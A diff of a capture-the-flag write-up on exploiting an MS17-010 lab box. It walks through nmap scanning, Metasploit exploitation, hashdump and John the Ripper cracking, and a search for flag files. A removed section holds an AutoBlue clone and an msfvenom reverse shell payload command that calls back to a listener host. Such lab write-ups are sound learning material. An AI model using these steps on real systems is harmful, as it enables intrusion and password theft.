@@ -8,17 +8,17 @@
 
 `nmap -A 10.10.68.22`
 
-``<img src="../../.gitbook/assets/image (1).png" alt="" data-size="original">``
+``<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="original">``
 
 The box is vulnerable to ms17-010
 
 `nmap -p135,139,445,3389 --script=vuln 10.10.68.22`
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Gain Access / Escalate
 
-#### Option #1 - Metasploit
+
 
 `msfconsole`&#x20;
 
@@ -32,19 +32,24 @@ The box is vulnerable to ms17-010
 
 `run`
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
-
-#### Option #2 - Manual
-
-Do later
-
-`git clone https://github.com/3ndG4me/AutoBlue-MS17-010 msfvenom -p windows/shell_reverse_tcp -f exe-service lhost=10.10.227.183 lport=443 -o ebevil.exe`
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Cracking
 
 `hashdump`
 
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+`john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
+
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-john --format=nt hashes.txt /find/rockyou.txt
+### Flags
 
+Just ran this to find the locations of all the flags then grabbed them
+
+`cd C:\`
+
+`dir "flag*" /s`
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
